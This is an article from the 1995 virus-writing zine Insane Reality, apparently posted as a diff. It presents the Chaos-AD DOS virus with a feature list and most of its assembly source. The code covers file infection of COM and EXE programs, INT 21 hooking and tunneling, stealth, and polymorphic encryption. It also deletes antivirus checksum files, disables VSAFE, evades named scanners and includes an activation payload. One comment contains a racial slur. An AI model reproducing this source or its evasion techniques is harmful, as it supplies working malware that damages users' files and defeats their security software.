@@ -1,0 +1,4396 @@
+Insane Reality issue #7 - (c)opyright 1995 Immortal Riot               File 016 
+
+
+% Chaos-AD by Sepultura %
+
+-------------------------
+
+Here's a kick ass contribution to our zine from Sepultura. 
+Sepultura being an Austrailian guy has made himself into one 
+of the main contributors to IR#7.
+
+
+
+Anyway, the virus will hit COM and EXE files on execute, attrib and 
+close. It'll disinfect files opened (on both normal and extended calls) 
+and when a file is being loaded (sorta executed) from debug. 
+
+
+Chaos-AD is also a polymorphic virus, and has a stand-alone engine 
+which can be linked into any virus out there.
+
+
+
+Furthermore it's a full stealth virus, and features a lot of other 
+interesting things (Like using the upper memory blocks if available) 
+that I'm sure you will notice if you study the source code below. 
+
+
+Thank you very much Sepultura!
+
+
+
+- The Unforgiven
+
+
+
+*****************************
+
+*** CHAOS-AD by Sepultura ***
+
+*** South Australia - '95 ***
+
+*****************************
+
+
+
+Polymorphic, Full(ish) Stealth, Retro, Anti-Heuristic, Tunneling, COM+EXE. 
+
+
+*** IMPORTANT ***
+
+
+
+This is the OFFICIAL version... due to a bit of a mistake, I sent a few ppl 
+on #virus the wrong version which has a TINY (one line) bug :P 
+
+
+******************
+
+
+
+********
+
+FEATURES:
+
+********
+
+Personal Stuff: - My First Polymorphic Virus.
+
+                - My First Full Stealth Virus.
+
+                - My First EXE infector.
+
+
+
+Retro Stuff:    - Deletes CHKLIST.CPS, CHKLIST.MS, ANTI-VIR.DAT files. 
+                - Avoids infecting AV programs.
+
+                - Disables VSAFE.
+
+                - Avoids VSAFE, and older versions of TBMEM, from reporting 
+                  changes to System Memory / Environment.
+
+
+
+Anti-Heuristics:- Uses some fairly heav Anti-Heuristic structures throughout. 
+                - TCE generates HUGE, spaced out Decryptors, avoiding # flag. 
+                - TBSCAN 6.50 finds 0 flags on DECRYPTED virus. 
+                - F-PROT( /paranoid) 2.19 finds nothing on DECRYPTED virus. 
+                - AVP 2.2 finds nothing on DECRYPTED virus. 
+                - About 10% of decryptors are flagged by TBSAN HR 
+                                                         (high heuristics). 
+                - No Decryptors (as far as i know) flagged by AVP, F-Prot. 
+
+
+Tunneling:      - Uses a /<-R4D NEW (I think) method to find the original 
+                  INT 21 vector.. see the subroutine find_21 for more info.. 
+
+
+Polymorphy:     - Polymorphy is provided by TCE-0.4 (The Chaos Engine). 
+
+
+                It can generate decryptors of the form:
+
+                   ADD/SUB/ADC/SBB/XOR [BP/SI/DI/BX(+xx(xx))],reg16 
+
+
+                It can move a value to a register as such: 
+                   MOV reg,VAL
+
+                or LEA reg,[VAL]
+
+                or XOR/SUB reg,reg + OR/XOR/ADD reg,VAL
+
+                or XOR/SUB reg,reg + SUB reg, negative VAL 
+
+
+                It can test for a zero value, using:
+
+                   OR/AND/TEST reg,reg
+
+
+
+                It can generate the following looping methods: 
+                   JNZ loopstart
+
+                or CLC + JA loopstart
+
+                or LOOP loopstart
+
+                or LOOPNZ loopstart
+
+
+
+                It can modify the KEY register, using:
+
+                   ADD/SUB/XOR reg,xxxx
+
+
+
+                - Although TCE is a stand alone engine, I do not really 
+                  expect other people to use it in their virii, mainly 
+                  because it sux, and there are many better engines around. 
+
+
+Stealth:        - This is probably the shittiest part of the virus! 
+                - I could not get FULL (disinfect on the fly) type stealth 
+                  working with the variable length poly, and size padding, 
+                  so for now I am using Disinfect on Open, Infect on Close 
+                  type stealth.
+
+                - It also Disinfects files loaded by debuggers. 
+                - If an archiver is running, it Infects instead of Disinfect. 
+
+
+Other Stuff:    - Marks files by padding the size up, so that the Least 
+                  Significant Byte, of the Size field, is ADh (chaos-AD). 
+                  This is reliable, and doesn't cause anything suspicious 
+                  looking..
+
+                - Has a Cool Activation Routine (see the sub-routine 
+                  setup_activator for more info).
+
+
+
+Things That Delayed This Viruses Progress:
+
+                - Drugs.
+
+                - School.
+
+                - Stupidity.
+
+                - I couldn't stop playing that 'Dont Touch The Sides' game 
+                  in VLAD-#3 (and i still cant :P).
+
+
+
+;==================================================================
+============= 
+        radix   16
+
+
+
+_rip            equ     014
+
+
+
+sft_open_mode   equ     W[di+02]
+
+sft_size_low    equ     W[di+11]
+
+sft_size_hi     equ     W[di+13]
+
+sft_point_low   equ     W[di+15]
+
+sft_point_hi    equ     W[di+17]
+
+sft_file_name   equ     W[di+20]
+
+sft_file_ext    equ     W[di+28]
+
+
+
+v_length        equ     (offset end - offset start)
+
+mem_length      equ     (v_length + 0f) / 10
+
+
+
+        org     0
+
+
+
+start:  sti                                     ;Cleanup after decryptor. 
+        cld
+
+
+
+        push    ds
+
+
+
+                                                ;Check if Resident. I made 
+        call    check_if_res                    ;this a call, as I also use 
+                                                ;it to get the Delta-offset. 
+delta_offset:
+
+        je      installed_b
+
+
+
+        mov     cl,0c1                          ;This is code to test for XTs 
+        mov     ax,1                            ;if an XT is running, AX=0 
+        shl     ax,cl                           ;because it gets shifted 
+        test    ax,ax                           ;a helluva lot.. 
+installed_b:
+
+        if z    jmp installed
+
+
+
+        call    find_21
+
+        mov     ax,5800
+
+        int     21
+
+        push    ax
+
+        mov     ax,5801
+
+        push    ax
+
+        mov     bx,0082                 ;Stratagie = Use Last Block, try UMBs 
+        int     21                      ;first...
+
+        mov     ax,5802
+
+        int     21
+
+        mov     ah,0
+
+        push    ax
+
+        mov     ax,5803
+
+        push    ax
+
+        mov     bl,1
+
+        int     21
+
+        mov     ah,48                   ;Allocate it...
+
+        mov     bx,mem_length
+
+        int     21
+
+        push    ax
+
+        dec     ax
+
+        mov     ds,ax
+
+        mov     W[1],8                  ;Mark as DOS..
+
+        pop     es
+
+        pop     ax
+
+        pop     bx
+
+        int     21
+
+        pop     ax
+
+        pop     bx
+
+        int     21
+
+
+
+        mov     ds,cs
+
+        mov     cx,v_length
+
+        push    si
+
+        call    _movsb
+
+        pop     si
+
+
+
+        mov     ds,es
+
+        mov     es,cx
+
+        mov     di,4b0
+
+        mov     virus_cs,ds                     ;Set Segment to JMP to, 
+                                                ;from INT 21 handler in 
+                                                ;BIOS area. 
+
+
+        push    si                              ;Copy Anti-Trace code into 
+        mov     si,offset bios_21_handler       ;unused BIOS area.. (0:4b0) 
+        mov     cx,(offset int_21_handler - bios_21_handler)+1 
+        call    _movsb                          ;Anti-Heuristic movsb.. 
+        pop     si
+
+
+
+        mov     bx,21
+
+        mov     di,bx
+
+        call    get_int                         ;Get Current INT 21 vector.. 
+        mov     int_21_off,bx
+
+        mov     int_21_seg,es
+
+
+
+        mov     ax,4b0                          ;Set INT 21 vector to 0:4b0. 
+        cwd
+
+        call    set_int
+
+
+
+        inc     W generation                    ;64th generation? 
+        and     W generation,3f                 ;prepare to activate if it 
+        if z    call setup_activator            ;is..
+
+                                                ;$$$$ change the last 3f to 
+                                                ;0 to see the activation 
+                                                ;routine quickly. 
+
+
+                                                ;This causes VSAFE, and older 
+        mov     ax,4b00                         ;Versions of TBMEM to save 
+        int     21                              ;the state of the current 
+                                                ;environment, avoiding stuff 
+                                                ;like the 'System Memory Has 
+                                                ;Been Modified' warning. 
+
+
+
+
+
+
+installed:
+
+        cmp     sp,1000 - 2                     ;File is EXE? 
+        je      restore_exe                     ;then resore it as EXE 
+
+
+        pop     ds                              ;else restore as COM 
+
+
+        mov     di,100
+
+        push    di
+
+        add     si,offset first_2
+
+        mov     es,cs
+
+        mov     cx,5                            ;restoring 5 bytes 
+        call    _movsb                          ;whilst avoiding heuristics. 
+        call    zero_regs                       ;clean-up after ourselves.. 
+        ret
+
+
+
+restore_exe:                                    ;Restore form .EXE 
+        pop     ax                              ;AX=original DS 
+        mov     es,ax
+
+        add     ax,10
+
+
+
+        mov     ds,cs
+
+
+
+        xchg    bp,ax
+
+        add     ax,[si+sexe_ss]
+
+        cli
+
+        mov     ss,ax                           ;restore SS:SP 
+        mov     sp,[si+sexe_sp]
+
+        sti
+
+        xchg    bp,ax
+
+
+
+        add     ax,[si+ret_cs]
+
+        push    ax                              ;PUSH CS
+
+        push    W [si+ret_ip]                   ;PUSH IP
+
+
+
+        mov     ds,es                           ;DS=ES=orig DS 
+
+
+        call    zero_regs                       ;tidy up.. 
+        retf                                    ;back to da start.. 
+
+
+sexe_ss                 dw      0
+
+sexe_sp                 dw      0
+
+ret_ip                  dw      0
+
+ret_cs                  dw      0
+
+
+
+check_if_res:                                   ;check if res/ 
+        xor     di,di                           ;get delta offset 
+        mov     ds,di                           ;DS=0
+
+        mov     bp,sp
+
+        mov     si,[bp]                         ;si=return of call off stack 
+        sub     si,offset delta_offset          ;  = delta offset 
+        cmp     B[4b0],9c                       ;0:4b0=PUSHF? 
+        ret
+
+
+
+bios_21_handler:                                ;This Handler is Placed at 
+        pushf                                   ;0:4b0. It runs some code 
+        push    ax                              ;that uses the stack to try 
+        xor     ax,ax                           ;and determine whether the 
+        push    ax                              ;INT 21 call is being traced, 
+        pop     ax                              ;and if it is not, JMPs to 
+        dec     sp,2                            ;the virus INT 21 handler, 
+        pop     ax                              ;otherwise it returns with an 
+        or      ax,ax                           ;IRET. Because INT 21 now 
+        pop     ax                              ;points to 0:4b0, it also 
+        jz      not_traced                      ;stops programs like Proview 
+        popf                                    ;form saying INT 21 points to 
+        iret                                    ;a suspicious area of RAM. 
+
+
+not_traced:     db      0ea                     ;JMP to proper Virus INT 21 
+                dw      offset int_21_handler   ;handler.. 
+virus_cs        dw      0                       ;This is patched to the virus 
+                                                ;CS..
+
+
+
+int_21_handler:                                 ;The Proper INT 21 handler. 
+        push    ax
+
+
+
+        xchg    ah,al                           ;CMP AL,xx is shorter, and 
+                                                ;avoids heuristics 
+
+
+        cmp     ax,004b                         ;Infect on Execute... 
+        je      infect_ds_dx
+
+        cmp     al,43                           ;Infect on Attribute Mod.. 
+        je      infect_ds_dx
+
+
+
+        cmp     al,3e                           ;Infect on Close.. 
+        je      infect_bx
+
+
+
+        cmp     al,6c                           ;Disinfect on Extended Open.. 
+        je      disinfect_ds_si
+
+
+
+        cmp     al,3d                           ;Disinfect on Open.. 
+        je      disinfect_ds_dx
+
+        cmp     al,4b                           ;Disinfect on Load (by Debug) 
+        je      disinfect_ds_dx
+
+
+
+        cmp     al,11                           ;Size stealth on Find First 
+        je      size_fcb
+
+        cmp     al,12                           ;and Find Next 
+        je      size_fcb
+
+
+
+        cmp     al,4e                           ;Size Stealth on DTA Find 1st 
+        je      size_dta
+
+        cmp     al,4f                           ;and DTA Find Next 
+        je      size_dta
+
+
+
+exit_int_21a:
+
+        pop     ax
+
+        popf
+
+
+
+next_21:
+
+                db      0ea
+
+int_21_off      dw      0
+
+int_21_seg      dw      0
+
+
+
+size_dta:
+
+        jmp     i_roq
+
+
+
+infect_bx:
+
+        pop     ax
+
+        popf
+
+
+
+        pusha
+
+        push    es,ds
+
+        call    is_caller_arc
+
+        jc      blah
+
+        call    infect_open_file
+
+        jmp     short blahha
+
+blah:   call    close_file
+
+blahha: pop     ds,es
+
+        popa
+
+        retf    2
+
+
+
+infect_ds_dx:
+
+        pusha
+
+        push    es,ds
+
+
+
+do_infect:
+
+        call    infect
+
+        jmp     short exit_id
+
+
+
+disinfect_ds_si:
+
+        pusha
+
+        mov     dx,si
+
+        db      0a8
+
+
+
+disinfect_ds_dx:
+
+        pusha
+
+
+
+do_disinfect:                           ;Disinfect file at DS:DX 
+        push    es,ds
+
+        call    is_caller_arc           ;If call made by Archiver, Infect 
+        jc      do_infect               ;instead..
+
+
+
+        call    disinfect
+
+
+
+exit_id:pop     ds,es
+
+        popa
+
+        jmp     short exit_int_21a
+
+
+
+size_fcb:
+
+        pop     ax
+
+
+
+        push    cs
+
+        call    next_21
+
+
+
+        pushf
+
+        pusha
+
+        push    ds,es
+
+        or      al,al
+
+        jnz     exit_size_fcb_b
+
+
+
+        call    is_caller_ass                   ;Exit if Anti-Size Stealth 
+        jc      exit_size_fcb_b                 ;program.. 
+
+
+
+
+        mov     al,2f
+
+        call    i21
+
+
+
+        mov     ds,es
+
+        cmp     B[bx],0ff
+
+        if e    add bx,7
+
+        lea     si,[bx+1]
+
+
+
+        mov     es,cs
+
+        mov     di,offset fcb_name
+
+        cld
+
+        mov     cx,8
+
+
+
+        call    fcb_name_loop
+
+        mov     al,'.'
+
+        stosb
+
+
+
+        dec     si
+
+        add     si,cx
+
+        mov     cx,3
+
+
+
+        call    fcb_name_loop
+
+
+
+put_null:
+
+        mov     al,0
+
+        stosb
+
+
+
+        mov     dx,offset fcb_name
+
+        mov     di,bx
+
+        cmp     B[bx+1d],0AD
+
+        jne     exit_size_fcb_b
+
+
+
+        call    set_int_24
+
+
+
+        mov     es,ds
+
+        mov     ds,cs
+
+        call    open_file
+
+        jc      exit_size_fcb
+
+        scasw
+
+        scasb
+
+        jmp     s_s_same
+
+
+
+exit_size_fcb:
+
+        call    restore_24
+
+
+
+exit_size_fcb_b:
+
+        pop     es,ds
+
+        popa
+
+        popf
+
+        retf    2
+
+
+
+fcb_name_loop:
+
+        lodsb
+
+        cmp     al,20
+
+        je      ret
+
+        stosb
+
+        loop    fcb_name_loop
+
+        ret
+
+
+
+disinfect:                              ;Disinfect DS:DX
+
+        call    open_file
+
+        if c    ret
+
+        xchg    bx,ax
+
+        mov     ds,cs
+
+        cld
+
+
+
+        call    set_int_24
+
+        call    get_sft
+
+        call    make_it_open
+
+
+
+        mov     cx,-1
+
+        mov     dx,-6
+
+        mov     ax,242
+
+        call    i21
+
+
+
+        cmp     al,0AD-6                ;Infected?
+
+        jne     exit_disinfect
+
+
+
+
+
+        mov     cx,6
+
+        mov     dx,offset s_s_buf
+
+        call    read_file
+
+        jc      exit_disinfect
+
+
+
+        cmp     W s_s_buf,0CA05
+
+        jne     exit_disinfect
+
+        push    W s_s_buf[4]
+
+        push    W s_s_buf[2]
+
+
+
+        mov     cx,-1
+
+        mov     dx,-6-1c
+
+        mov     ax,242
+
+        call    i21
+
+
+
+        mov     dx,offset first_2
+
+        mov     cx,1c
+
+        push    cx,dx
+
+
+
+        call    read_file
+
+        call    seek_to_start
+
+
+
+        pop     dx,cx
+
+        call    write_file
+
+
+
+        pop     dx,cx
+
+        mov     ax,0042
+
+        call    i21
+
+
+
+        mov     cx,0
+
+        call    write_file
+
+
+
+exit_disinfect:
+
+        call    close_file_b
+
+        call    restore_24
+
+        ret
+
+
+
+infect: call    open_file
+
+        jc      ret
+
+        xchg    bx,ax
+
+
+
+infect_open_file:
+
+        mov     ds,cs
+
+        cld
+
+        call    set_int_24
+
+
+
+        call    get_sft
+
+        cmp     es:sft_file_ext[1],'MO' ;*.?OM
+
+        je      is_executable
+
+        cmp     es:sft_file_ext[1],'EX' ;*.?XE
+
+        jne     bad_name
+
+
+
+is_executable:
+
+        mov     dx,es:sft_file_name
+
+        mov     cx,8
+
+        mov     si,offset evil_names    ;Dont infect AV / Command.com / Bait 
+
+
+name_check:
+
+        lodsw
+
+        cmp     ax,dx
+
+        loopne  name_check
+
+        jne     name_is_kewl
+
+
+
+bad_name:
+
+        jmp exit_infect
+
+
+
+name_is_kewl:
+
+        call    make_it_open
+
+
+
+        call    seek_to_start
+
+
+
+        mov     cx,1c
+
+        mov     dx,offset first_2
+
+        call    read_file
+
+        jc      bad_name
+
+
+
+        call    seek_to_end
+
+
+
+        cmp     al,0AD                  ;If Size = ??AD, file is already 
+        if e    jmp exit_infect         ;infected..
+
+
+
+        mov     B is_exe,1
+
+        mov     cx,W first_2
+
+        xor     cl,ch
+
+        cmp     cl,'M' xor 'Z'
+
+        je      check_exe
+
+
+
+        mov     B is_exe,0
+
+
+
+        or      dx,dx
+
+        jnz     bad_name
+
+
+
+        cmp     ax,0feff - v_length - 190
+
+        ja      bad_name
+
+        jmp     short is_big_enuf
+
+
+
+check_exe:
+
+        pusha
+
+        push    es
+
+        mov     es,ds
+
+        mov     si,offset exe_ss
+
+        mov     di,offset sexe_ss
+
+        cld
+
+        movsw
+
+        movsw
+
+        lodsw
+
+        movsw
+
+        movsw
+
+        pop     es
+
+        popa
+
+
+
+        cmp     dx,000e
+
+        ja      bad_name
+
+        or      dx,dx
+
+        jnz     is_big_enuf
+
+        cmp     ax,1388
+
+        jb      bad_name
+
+
+
+is_big_enuf:
+
+        mov     orig_size_hi,dx
+
+        mov     orig_size_low,ax
+
+
+
+        add     ax,100
+
+        mov     W jmp_buffer,ax
+
+
+
+ih8sp:  in      al,40
+
+        and     al,7
+
+        cmp     al,4
+
+        je      ih8sp
+
+
+
+        mov     si,offset jmp_buffer - 1
+
+        and     B[si],NOT 7
+
+        and     B[si+4],NOT 7
+
+
+
+        or      B[si],al
+
+        or      B[si+4],al
+
+
+
+        pusha                   ;Calling The Chaos Engine
+
+        push    ds,es
+
+
+
+        mov     ds,cs
+
+        xor     di,di           ;ES:DI = encryption buffer 
+        xor     si,si           ;DS:SI = Code
+
+        mov     cx, v_length    ;CX = Length of Code
+
+        push    0be00
+
+        pop     es
+
+        cmp     es:[di],720
+
+        je      free_video
+
+        stc
+
+        jmp     short no_free_video
+
+
+
+free_video:
+
+        mov     dx,W jmp_buffer
+
+        xor     ax,ax
+
+        cmp     is_exe,1
+
+        jne     poly_com
+
+        mov     ax,4            ;add CS: if EXE
+
+        and     dx,0f           ;Delta offset = 0 if EXE
+
+
+
+poly_com:
+
+        call    tce
+
+        call    write_file
+
+
+
+        pushf
+
+        mov     cx,v_length / 2
+
+        mov     ax,720
+
+        rep     stosw
+
+        popf
+
+
+
+no_free_video:
+
+        pop     es,ds
+
+        popa
+
+
+
+        if c    jmp exit_infect
+
+
+
+        call    seek_to_end
+
+
+
+        mov     cx,ax
+
+        mov     al,0AD-1c-6             ;Length of File will = ??AD (marker) 
+        cmp     ax,cx                   ;after six bytes containing original 
+        adc     ah,0                    ;are written to End of File.. 
+        adc     dx,0
+
+        xchg    dx,ax
+
+        xchg    cx,ax
+
+        mov     ax,0042
+
+        call    i21
+
+        push    ax
+
+
+
+        mov     cx,1c
+
+        mov     dx,offset first_2
+
+        call    write_file
+
+        mov     cx,6
+
+        mov     dx,offset save_size_buf
+
+        call    write_file
+
+
+
+        pop     ax
+
+        cmp     is_exe,1
+
+        je      do_exe
+
+
+
+        call    seek_to_start
+
+
+
+        mov     ds,cs
+
+        mov     dx,offset jmp_buffer-1
+
+        mov     cx,5
+
+        call    write_file
+
+        jmp     exit_infect
+
+
+
+do_exe: cmp     W exe_first_reloc_item,40
+
+        je      is_overlay
+
+        cmp     W exe_overlay_num,0
+
+        jz      not_overlay
+
+
+
+is_overlay:
+
+        jmp     exit_infect
+
+
+
+not_overlay:
+
+        cmp     W exe_max_mem_paras,0ffff
+
+        jne     is_overlay
+
+
+
+        mov     si,W orig_size_hi
+
+        mov     cx,W orig_size_low
+
+
+
+        mov     ax,W exe_total_pages
+
+        mov     cx,200
+
+        mul     cx
+
+        cmp     dx,si
+
+        jb      is_overlay
+
+        cmp     ax,cx
+
+        jb      is_overlay
+
+
+
+        mov     ax,W orig_size_low
+
+        mov     dx,W orig_size_hi
+
+
+
+        mov     cx,10
+
+        div     cx
+
+
+
+        sub     ax,W exe_header_paras
+
+        mov     W exe_cs,ax
+
+        mov     W exe_ip,dx            ;DX = Delta Offset
+
+
+
+        add     ax,20
+
+        mov     W exe_ss,ax
+
+        mov     W exe_sp,1000
+
+
+
+        add     ax,1a
+
+        cmp     W exe_min_mem_paras,ax
+
+        if ng   mov W exe_min_mem_paras,ax
+
+
+
+        call    seek_to_end
+
+        mov     cx,200
+
+        div     cx
+
+        inc     ax
+
+        mov     W exe_total_pages,ax
+
+        mov     W exe_last_page_bytes,dx
+
+
+
+        call    seek_to_start
+
+
+
+        mov     dx,offset first_2
+
+        mov     cx,1c
+
+        call    write_file
+
+
+
+exit_infect:
+
+        call    close_file_b
+
+
+
+        call    restore_24
+
+        ret
+
+
+
+i_roq:
+
+        pop     ax
+
+
+
+        push    cs
+
+        call    next_21
+
+
+
+        pushf
+
+        pusha
+
+        push    ds,es
+
+        jc      exit_size_dta_b
+
+
+
+        call    is_caller_ass
+
+        jc      exit_size_dta_b
+
+
+
+
+
+
+
+        mov     al,2f
+
+        call    i21
+
+        mov     ds,es
+
+
+
+        mov     di,bx
+
+        lea     dx,[di+1e]
+
+        cmp     B[di+1b],0AD
+
+        jne     exit_size_dta_b
+
+
+
+        call    set_int_24
+
+
+
+        call    open_file
+
+        jc      exit_size_dta
+
+
+
+        mov     es,ds
+
+        mov     ds,cs
+
+
+
+s_s_same:
+
+        xchg    bx,ax
+
+        mov     cx,-1
+
+        mov     dx,-6
+
+        mov     ax,0242
+
+        call    i21
+
+
+
+        mov     dx,offset s_s_buf
+
+        mov     cx,6
+
+        call    read_file
+
+        jc      exit_size_dta
+
+
+
+        call    close_file
+
+
+
+        cmp     W s_s_buf,0ca05
+
+        jne     exit_size_dta
+
+
+
+        mov     si,offset s_s_buf+2
+
+        add     di,1a
+
+        movsw
+
+        movsw
+
+
+
+exit_size_dta:
+
+        call    restore_24
+
+
+
+exit_size_dta_b:
+
+        pop     es,ds
+
+        popa
+
+        popf
+
+        retf    2
+
+
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+;;; SUB - ROUTINES               ;;;
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+
+
+Int_24_handler:                                 ;The INT 24 handler, to avoid 
+        mov     al,3                            ;Write Protect Errors. 
+        iret
+
+
+
+;*********************************************
+
+;*********************************************
+
+;*** Check This Funky Routine Out Nigger!! ***
+
+;*********************************************
+
+;*********************************************
+
+
+
+;This is the Funky NEW (I think) method to tunnel for the original INT 21 
+;handler! Heres What it Does:
+
+
+
+;1. It hooks INT 2A, which is called by DOS on all DOS calls (below AH=6C) 
+
+
+;2. It issues a DOS call to Restore the INT 2A vector! This looks like it 
+;   has hooked it, and then simply just set it back again.. completely harm- 
+;   less!
+
+
+
+;3. The INT 2A vector gets the Return CS:IP of the stack, and uses this to 
+;   scan for the entry point to the DOS kernel.
+
+
+
+find_21:mov     ds,cs
+
+
+
+        mov     ax,352a                 ;Save original INT 2A vector. 
+        int     21
+
+        mov     i2a_off[si],bx
+
+        mov     i2a_seg[si],es
+
+        push    es,bx
+
+
+
+        mov     ah,25                   ;Set INT 2A to the New INT 2A vector. 
+        push    ax
+
+        lea     dx,offset int_2a_handler[si]    ;SI=delta offset 
+        int     21
+
+
+
+        pop     ax,dx,ds                ;Restore INT 2A vector.. 
+        int     21
+
+        ret                             ;and return..
+
+
+
+int_2a_handler:
+
+        pushf
+
+        pusha
+
+        push    es
+
+        mov     bp,sp
+
+
+
+        call    delta2                  ;Get Delta offset
+
+delta2: pop     si
+
+        les     di,bp[_rip]             ;ES:DI = return address, off stack. 
+        std                             ;Search Backwards.. 
+        mov     al,0FA                  ;Look for CLI (DOS entry point). 
+
+
+try_again:
+
+        scasb
+
+        jne     try_again
+
+
+
+        inc     di                      ;DI=Entry point.
+
+        mov     cs:i21o[si-offset delta2],di    ;Save Offset 
+        mov     cs:i21s[si-offset delta2],es    ;Save Segment 
+
+
+        pop     es
+
+        popa
+
+        popf
+
+
+
+        db      0ea                     ;And Continue..
+
+i2a_off dw      0
+
+i2a_seg dw      0
+
+
+
+;;;;;;;;;;;;;;;;;;;;;
+
+;;File IO routines..
+
+
+
+open_file:
+
+        mov     ax,003d
+
+        jmp     short i21
+
+
+
+close_file_b:
+
+        or      es:B[di+6],40           ;This preserves Time and Date stamp.. 
+
+
+close_file:
+
+        mov     al,3e
+
+        db      0a9
+
+
+
+write_file:
+
+        mov     al,40
+
+        db      0a9
+
+
+
+read_file:
+
+        mov     al,3f
+
+
+
+
+
+i21:    xchg    ah,al           ;call tunneled INT 21
+
+        pushf                   ;XCHG AH,AL for Anti-Heuristics.. 
+        db      09a
+
+i21o    dw      0
+
+i21s    dw      0
+
+        ret
+
+
+
+seek_to_end:
+
+        mov     ah,02
+
+        db      0a9
+
+seek_to_start:
+
+        mov     ah,00
+
+        mov     al,42
+
+        xor     cx,cx
+
+        cwd
+
+        jmp     short i21
+
+
+
+
+
+get_int:shl     bx,2    ;Returns ES:BX holding 32 bit vector of 
+        push    0       ;the interrupt in BX.
+
+        pop     es
+
+        les     es:bx,[bx]
+
+        ret
+
+
+
+restore_24:
+
+        push    bx
+
+        call    restore_vsafe
+
+        pop     bx
+
+
+
+        mov     di,24
+
+        mov     ax,0
+
+        org     $-2
+
+int_24_off      dw      0
+
+
+
+        mov     dx,0
+
+        org     $-2
+
+int_24_seg      dw      0
+
+
+
+set_int:cld
+
+        shl     di,2    ;Sets the Interrupt in DI to point to 
+        push    es      ;DX:AX.
+
+        push    0
+
+        pop     es
+
+        stosw
+
+        xchg    dx,ax
+
+        stosw
+
+        pop     es
+
+        ret
+
+
+
+get_sft:push    bx      ;Get the SFT, avoiding Heursitic Flags 
+        mov     ax,NOT 1220
+
+        not     ax
+
+        int     2f
+
+        mov     bl,es:[di]
+
+        mov     ax,NOT 1216
+
+        not     ax
+
+        int     2f
+
+        pop     bx
+
+        ret
+
+
+
+make_it_open:
+
+        and     es:W sft_open_mode,NOT 1
+
+        or      es:W sft_open_mode,2
+
+        ret
+
+
+
+zero_regs:
+
+        mov     cx,8
+
+zrl:    push    0
+
+        loop    zrl
+
+        popa
+
+        sahf
+
+        ret
+
+
+
+set_int_24:
+
+        pusha
+
+        push    ds,es
+
+
+
+        mov     ds,cs
+
+        mov     bx,24
+
+        mov     di,bx
+
+        call    get_int
+
+        mov     int_24_off,bx
+
+        mov     int_24_seg,es
+
+        mov     dx,cs
+
+        mov     ax,offset int_24_handler
+
+        call    set_int
+
+
+
+        call    turn_off_vsafe
+
+
+
+        mov     di,27
+
+kill_next:
+
+        lea     dx,[di+offset files_to_kill-0d]
+
+        mov     ax,0143
+
+        xor     cx,cx
+
+        call    i21
+
+        mov     al,41
+
+        call    i21
+
+        sub     di,0d
+
+        jnz     kill_next
+
+
+
+        pop     es,ds
+
+        popa
+
+        ret
+
+
+
+get_caller:
+
+        push    bx
+
+        mov     al,62
+
+        call    i21
+
+        dec     bx
+
+        mov     es,bx
+
+        mov     di,8
+
+        mov     ax,es:[di]
+
+        pop     bx
+
+        ret
+
+
+
+is_caller_ass:
+
+        pusha
+
+        push    ds,es
+
+        call    get_caller
+
+        mov     es,cs
+
+        mov     di,offset no_s_s
+
+        mov     cx,0e
+
+        cld
+
+        repne   scasw
+
+        je      set_c
+
+        jmp     short clr_c
+
+
+
+is_caller_arc:
+
+        pusha
+
+        push    ds,es
+
+        call    get_caller
+
+        mov     es,cs
+
+        mov     di,offset no_f_s
+
+        mov     cx,08
+
+        cld
+
+        repne   scasw
+
+        je      set_c
+
+
+
+clr_c:  pop     es,ds
+
+        popa
+
+        clc
+
+        ret
+
+
+
+set_c:  pop     es,ds
+
+        popa
+
+        stc
+
+        ret
+
+
+
+_movsb: lodsb
+
+        stosb
+
+        loop    _movsb
+
+        ret
+
+
+
+turn_off_vsafe:                 ;Anti-Vsafe Shit..
+
+        xor     bl,bl
+
+        db      0a9
+
+restore_vsafe:
+
+        mov     bl,0
+
+
+
+                org     $-1
+
+old_vsafe               db      0
+
+
+
+        pusha
+
+        mov     ax,0fa02
+
+        mov     dx,5945
+
+        int     16
+
+        mov     cs:old_vsafe,cl
+
+        popa
+
+        ret
+
+
+
+setup_activator:                ;This sets up a TSR to execute the activator 
+        pusha                   ;when appropriate. It hooks INT 9 and hooks 
+        push    ds,es           ;INT 2F. The actual activator is run, when 
+                                ;these handlers either see that 256 keys have 
+        mov     bx,2f           ;been pressed, or when windows is run.. 
+        mov     di,bx           ;These handlers are only installed when the 
+        call    get_int         ;64th generation of the Virus is run. 
+        mov     i2f_off,bx
+
+        mov     i2f_seg,es      ;See what the activation routine looks like 
+                                ;make the modifications where you see the 
+        mov     dx,ds           ;$$$$ marker.. making these modifications 
+        mov     ax,offset int_2f_handler        ;will cause it to activate 
+        call    set_int         ;on any generation, when 5 keys are pressed. 
+
+
+
+
+        mov     dx,ds
+
+        mov     bx,9
+
+        mov     di,bx
+
+        call    get_int
+
+        mov     i9_off,bx
+
+        mov     i9_seg,es
+
+
+
+        mov     B keys_pressed,0        ;$$$$ change the 0 to -5 to see the 
+                                        ;activation quicker.. 
+        mov     ax,offset int_9_handler
+
+        call    set_int
+
+
+
+        pop     es,ds
+
+        popa
+
+        ret
+
+
+
+int_9_handler:
+
+        pushf
+
+        cli
+
+        inc     cs:B keys_pressed
+
+        if z    call activator
+
+        popf
+
+
+
+        db      0ea
+
+i9_off  dw      0
+
+i9_seg  dw      0
+
+
+
+int_2f_handler:
+
+        pushf
+
+        cmp     ax,1605
+
+        if e    call activator
+
+        popf
+
+
+
+        db      0ea
+
+i2f_off dw      0
+
+i2f_seg dw      0
+
+
+
+activator:
+
+        cld
+
+        pusha
+
+        push    ds,es
+
+
+
+        mov     ds,cs
+
+
+
+        mov     ax,3
+
+        int     10
+
+
+
+
+
+        mov     dx,080c
+
+        call    set_pos
+
+        mov     si,offset msg1
+
+        call    print_string
+
+
+
+        mov     dx,090c
+
+        call    set_pos
+
+        mov     si,offset msg2
+
+        call    print_string
+
+        mov     bp,28
+
+
+
+www:    mov     si,offset word1
+
+
+
+wwww:   mov     dx,0b23
+
+        call    set_pos
+
+        call    print_string
+
+        cmp     si,offset word2
+
+        jae     www
+
+        dec     bp
+
+        jnz     wwww
+
+
+
+wwwww:  mov     ax,3
+
+        int     10
+
+        pop     es,ds
+
+        popa
+
+        ret
+
+
+
+print_string:
+
+        lodsb
+
+        mov     ah,0e
+
+        int     10
+
+        cmp     al,7
+
+        jbe     ret
+
+        jmp     short print_string
+
+
+
+set_pos:mov     ah,2
+
+        mov     bh,0
+
+        int     10
+
+        ret
+
+
+
+msg1:   db      '- [CHAOS-AD] - CODED BY SEPULTURA - AUSTRALIA - 1995 -',0
+
